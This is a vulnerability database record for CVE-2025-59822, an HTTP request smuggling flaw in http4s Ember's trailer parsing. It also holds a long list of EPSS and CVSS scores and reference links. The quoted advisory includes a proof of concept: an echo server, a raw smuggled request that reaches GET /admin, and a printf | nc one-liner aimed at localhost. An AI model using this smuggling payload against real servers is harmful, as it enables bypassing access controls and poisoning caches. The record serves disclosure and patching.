vulnerability_id: VCID-bsbj-8dpq-rybu
aliases:
  - CVE-2025-59822
  - GHSA-wcwh-7gfw-5wrr
summary: "Http4s vulnerable to HTTP Request Smuggling due to improper handling of HTTP trailer\
  \ section\n### Summary\nhttp4s is vulnerable to HTTP Request Smuggling due to improper handling\
  \ of HTTP trailer section.\nThis vulnerability could enable attackers to:\n- Bypass front-end\
  \ servers security controls\n- Launch targeted attacks against active users\n- Poison web\
  \ caches\n\nPre-requisites for the exploitation: the web appication has to be deployed behind\
  \ a reverse-proxy that forwards trailer headers.\n\n### Details\nThe HTTP chunked message\
  \ parser, after parsing the last body chunk, calls `parseTrailers` (`ember-core/shared/src/main/scala/org/http4s/ember/core/ChunkedEncoding.scala#L122-142`).\n\
  This method parses the trailer section using `Parser.parse`, where the issue originates.\n\
  \n`parse` has a bug that allows to terminate the parsing before finding the double CRLF condition:\
  \ when it finds an header line that **does not include the colon character**, it continues\
  \ parsing with `state=false` looking for the header name till reaching the condition `else\
  \ if (current == lf && (idx > 0 && message(idx - 1) == cr))` that sets `complete=true` even\
  \ if no `\\r\\n\\r\\n` is  found.\n```scala\nif (current == colon) {\n  state = true // set\
  \ state to check for header value\n  name = new String(message, start, idx - start) // extract\
  \ name string\n  start = idx + 1 // advance past colon for next start\n\n  // TODO: This if\
  \ clause may not be necessary since the header value parser trims\n  if (message.size > idx\
  \ + 1 && message(idx + 1) == space) {\n    start += 1 // if colon is followed by space advance\
  \ again\n    idx += 1 // double advance index here to skip the space\n  }\n  // double CRLF\
  \ condition - Termination of headers\n} else if (current == lf && (idx > 0 && message(idx\
  \ - 1) == cr)) { // <----- not a double CRLF check\n  complete = true // completed terminate\
  \ loop\n}\n```\nThe remainder left in the buffer is then parsed as another request leading\
  \ to HTTP Request Smuggling.\n\n### PoC\n\nStart a simple webserver that echoes the received\
  \ requests:\n```scala\nimport cats.effect._\nimport cats.implicits._\nimport org.http4s._\n\
  import org.http4s.dsl.io._\nimport org.http4s.ember.server.EmberServerBuilder\nimport org.http4s.server.Router\n\
  import org.http4s.server.middleware.RequestLogger\nimport org.typelevel.log4cats.LoggerFactory\n\
  import org.typelevel.log4cats.slf4j.Slf4jFactory\nimport com.comcast.ip4s._\n\nobject ExploitServer\
  \ extends IOApp {\n\n  implicit val loggerFactory: LoggerFactory[IO] = Slf4jFactory.create[IO]\n\
  \n  val echoService: HttpRoutes[IO] = HttpRoutes.of[IO] {\n    case req @ _ =>\n      for\
  \ {\n        bodyStr <- req.bodyText.compile.string\n        method = req.method.name\n  \
  \      uri = req.uri.toString()\n        version = req.httpVersion.toString\n        headers\
  \ = req.headers.headers.map { header =>\n          s\"${header.name.toString.toLowerCase}:\
  \ ${header.value}\"\n        }.mkString(\"\\n\")\n        \n        responseText = s\"\"\"\
  $method $uri $version\n$headers\n\n$bodyStr\n\n\"\"\"\n        result <- Ok(responseText)\n\
  \      } yield result\n  }\n\n  val httpApp = RequestLogger.httpApp(logHeaders = true, logBody\
  \ = true)(\n    Router(\"/\" -> echoService).orNotFound\n  )\n\n  override def run(args: List[String]):\
  \ IO[ExitCode] = {\n    EmberServerBuilder\n      .default[IO]\n      .withHost(ipv4\"0.0.0.0\"\
  )\n      .withPort(port\"8080\")\n      .withHttpApp(httpApp)\n      .build\n      .use {\
  \ server =>\n        IO.println(s\"Server started at http://0.0.0.0:8080\") >> IO.never\n\
  \      }\n      .as(ExitCode.Success)\n  }\n}\n```\n\n`build.sbt`\n```\nThisBuild / scalaVersion\
  \ := \"2.13.15\"\n\nval http4sVersion = \"0.23.30\"\n\nlazy val root = (project in file(\"\
  .\"))\n  .settings(\n    name := \"http4s-echo-server\",\n    libraryDependencies ++= Seq(\n\
  \      \"org.http4s\" %% \"http4s-ember-server\" % http4sVersion,\n      \"org.http4s\" %%\
  \ \"http4s-dsl\" % http4sVersion,\n      \"org.http4s\" %% \"http4s-circe\" % http4sVersion,\n\
  \      \"ch.qos.logback\" % \"logback-classic\" % \"1.4.11\",\n      \"org.typelevel\" %%\
  \ \"log4cats-slf4j\" % \"2.6.0\",\n    )\n  )\n```\n\nSend the following request:\n```http\n\
  POST / HTTP/1.1\nHost: localhost\nTransfer-Encoding: chunked\n\n2\naa\n0\nTest: smuggling\n\
  a\nGET /admin HTTP/1.1\nHost: localhost\n\n```\n\nYou can do that with the following command:\n\
  `printf 'POST / HTTP/1.1\\r\\nHost: localhost\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n2\\\
  r\\naa\\r\\n0\\r\\nTest: smuggling\\r\\na\\r\\nGET /admin HTTP/1.1\\r\\nHost: localhost\\\
  r\\n\\r\\n' | nc localhost 8080`\n\nYou will see that the request is interpreted as two separate\
  \ requests\n```\n16:18:02.015 [io-compute-19] INFO org.http4s.server.middleware.RequestLogger\
  \ -- HTTP/1.1 POST / Headers(Host: localhost, Transfer-Encoding: chunked) body=\"aa\"\n16:18:02.027\
  \ [io-compute-19] INFO org.http4s.server.middleware.RequestLogger -- HTTP/1.1 GET /admin Headers(Host:\
  \ localhost)\n```"
severities:
  - score: '0.00038'
    scoring_system: epss
    scoring_elements: '0.10773'
    published_at: '2025-10-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00038'
    scoring_system: epss
    scoring_elements: '0.10741'
    published_at: '2025-10-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00038'
    scoring_system: epss
    scoring_elements: '0.10804'
    published_at: '2025-10-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00038'
    scoring_system: epss
    scoring_elements: '0.10733'
    published_at: '2025-10-20 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00038'
    scoring_system: epss
    scoring_elements: '0.10823'
    published_at: '2025-10-13 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00038'
    scoring_system: epss
    scoring_elements: '0.10861'
    published_at: '2025-10-15 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00038'
    scoring_system: epss
    scoring_elements: '0.10873'
    published_at: '2025-10-16 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00038'
    scoring_system: epss
    scoring_elements: '0.10851'
    published_at: '2025-10-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00038'
    scoring_system: epss
    scoring_elements: '0.10821'
    published_at: '2025-10-18 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00041'
    scoring_system: epss
    scoring_elements: '0.12156'
    published_at: '2025-10-30 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00041'
    scoring_system: epss
    scoring_elements: '0.1223'
    published_at: '2025-11-02 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00041'
    scoring_system: epss
    scoring_elements: '0.12189'
    published_at: '2025-11-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00041'
    scoring_system: epss
    scoring_elements: '0.12155'
    published_at: '2025-10-25 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00041'
    scoring_system: epss
    scoring_elements: '0.12137'
    published_at: '2025-10-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00041'
    scoring_system: epss
    scoring_elements: '0.12144'
    published_at: '2025-10-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00042'
    scoring_system: epss
    scoring_elements: '0.12247'
    published_at: '2025-09-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00042'
    scoring_system: epss
    scoring_elements: '0.12426'
    published_at: '2025-09-27 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00042'
    scoring_system: epss
    scoring_elements: '0.12422'
    published_at: '2025-09-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00055'
    scoring_system: epss
    scoring_elements: '0.17362'
    published_at: '2025-10-06 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00055'
    scoring_system: epss
    scoring_elements: '0.17493'
    published_at: '2025-10-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00055'
    scoring_system: epss
    scoring_elements: '0.17476'
    published_at: '2025-10-02 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00055'
    scoring_system: epss
    scoring_elements: '0.17499'
    published_at: '2025-10-01 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00055'
    scoring_system: epss
    scoring_elements: '0.17419'
    published_at: '2025-09-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00055'
    scoring_system: epss
    scoring_elements: '0.17333'
    published_at: '2025-10-07 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00055'
    scoring_system: epss
    scoring_elements: '0.1737'
    published_at: '2025-10-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00058'
    scoring_system: epss
    scoring_elements: '0.18529'
    published_at: '2026-01-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: '0.00058'
    scoring_system: epss
    scoring_elements: '0.18548'
    published_at: '2026-01-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
  - score: MODERATE
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-wcwh-7gfw-5wrr
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/http4s/http4s
  - score: '6.3'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/http4s/http4s/commit/dd518f7c967e5165813b8d4a48a82b8fab852d41
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/http4s/http4s/commit/dd518f7c967e5165813b8d4a48a82b8fab852d41
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-09-23T19:15:00Z/
    published_at: None
    url: https://github.com/http4s/http4s/commit/dd518f7c967e5165813b8d4a48a82b8fab852d41
  - score: MODERATE
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/http4s/http4s/security/advisories/GHSA-wcwh-7gfw-5wrr
  - score: '6.3'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/http4s/http4s/security/advisories/GHSA-wcwh-7gfw-5wrr
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/http4s/http4s/security/advisories/GHSA-wcwh-7gfw-5wrr
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-09-23T19:15:00Z/
    published_at: None
    url: https://github.com/http4s/http4s/security/advisories/GHSA-wcwh-7gfw-5wrr
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-59822
weaknesses:
  - CWE-1035
  - CWE-937
  - CWE-444
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-59822
    reference_type:
    reference_id:
  - url: https://github.com/http4s/http4s
    reference_type:
    reference_id:
  - url: https://github.com/http4s/http4s/commit/dd518f7c967e5165813b8d4a48a82b8fab852d41
    reference_type:
    reference_id:
  - url: https://github.com/http4s/http4s/security/advisories/GHSA-wcwh-7gfw-5wrr
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-59822
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-wcwh-7gfw-5wrr
    reference_type:
    reference_id: GHSA-wcwh-7gfw-5wrr
